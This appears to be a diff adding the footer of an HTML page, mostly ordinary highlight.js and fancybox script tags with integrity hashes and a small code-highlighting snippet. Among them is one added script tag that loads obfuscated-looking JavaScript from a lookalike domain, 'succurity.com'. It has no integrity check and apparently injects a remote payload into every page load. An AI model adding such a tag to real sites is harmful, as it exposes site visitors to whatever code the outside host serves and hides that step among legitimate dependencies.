+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/highlight.min.js" integrity="sha512-z+/WWfyD5tccCukM4VvONpEtLmbAm5LDu7eKiyMQJ9m7OfPEDL7gENyDRL3Yfe8XAuGsS2fS4xSMnl6d30kqGQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.js" integrity="sha512-uURl+ZXMBrF4AwGaWmEetzrd+J5/8NRkWAvJx5sbPSSuOb0bZLqf+tOzniObO00BjHa/dD7gub9oCGMLPQHtQA==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+
+
+<script src="https://succurity.com/js/script-yqzy9wdlzix4lbbwdnzvwx3egsne77earqmn73v9uno8aupuph8wfguccut.min.js"></script>
+
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-gE8KAQyFIzV1C9+GZ8TKJHZS2s+n7EjNtC+IMRn1l5+WYJTHOODUM6JSjZhFhqXmc7bG8Av6XXpckA4tYhflnw==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/apache.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-EWROca+bote+7Oaaar1F6y74iZj1r1F9rm/ly7o+/FwJopbBaWtsFDmaKoZDd3QiGU2pGacBirHJNivmGLYrow==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/go.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-GDVzAn0wpx1yVtQsRWmFc6PhJiLBPdUic+h4GWgljBh904O3JU10fk9EKNpVyIoPqkFn54rgL2QBG4BmUTMpiQ==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/http.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-UgZlma8NzkrDb/NWgmLIcTrH7i/CSnLLDRFqCSNF5NGPpjKmzyM25qcoXGOup8+cDakKyaiTDd7N4dyH4YT+IA==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/less.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-lot9koe73sfXIrUvIPM/UEhuMciN56RPyBdOyZgfO53P2lkWyyXN7J+njcxIIBRV+nVDQeiWtiXg+bLAJZDTfg==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/nginx.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-Zd3e7XxHP00TD0Imr0PIfeM0fl0v95kMWuhyAS3Wn1UTSXTkz0OhtRgBAr4JlmADRgiXr4x7lpeUdqaGN8xIog==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/puppet.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-qtqDO052iXMSP+5d/aE/jMtL9vIIGvONgTJziC2K/ZIB1yEGa55WVxGE9/08rSQ62EoDifS9SWVGZ7ihSLhzMA==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/scss.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-1NmkjnEDnwwwcu28KoQF8vs3oaPFokQHbmbtwGhFfeDsQZtVFI8zW2aE9O8yMYdpdyKV/5blE4pSWw4Z/Sv97w==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/stylus.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-B2wSfruPjr8EJL6IIzQr1eAuDwrsfIfccNf/LCEdxELCgC/S/ZMt/Uvk80aD79m7IqOqW+Sw8nbkvha20yZpzg==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/swift.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-28oDiQZGKUVN6wQ7PSLPNipOcmkCALXKwOi7bnkyFf8QiMZQxG9EQoy/iiNx6Zxj2cG2SbVa4dXKigQhu7GiFw==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/yaml.min.js"></script>
+  
+
+
+<script>
+$(document).ready(function() {
+  hljs.configure({ classPrefix: '', useBR: false });
+  $('pre.code-highlight > code, pre > code').each(function(i, block) {
+    if (!$(this).hasClass('codeblock')) {
+      $(this).addClass('codeblock');
+    }
+    hljs.highlightBlock(block);
+  });
+});
+</script>
+
+
+
+
+    
+  </body>
+</html>
+
